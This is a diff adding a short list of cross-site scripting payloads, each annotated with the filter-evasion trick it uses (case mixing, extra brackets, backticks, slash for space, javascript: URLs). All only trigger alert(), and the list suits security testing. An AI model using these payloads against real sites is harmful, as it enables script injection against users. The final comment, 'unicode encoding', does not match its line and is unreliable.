@@ -1,0 +1,9 @@
+<sCrIpT>alert(chtPT)</sCriPt> #changing the case of the tag
+<<script>alert(chtPT)</script> #prepending an additional "<"
+<script>alert(chtPT) // #removing the closing tag
+<script>alert`chtPT`</script> #using backticks instead of parenetheses
+<iframe src=http://chtPT.com < #double open angle brackets
+<STYLE>.classname{background-image:url("javascript:alert(chtPT)");}</STYLE> #uncommon tags
+<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>chtPT</a> #extra characters
+<iframe src="javascript:alert(`chtPT`)"> #unicode encoding
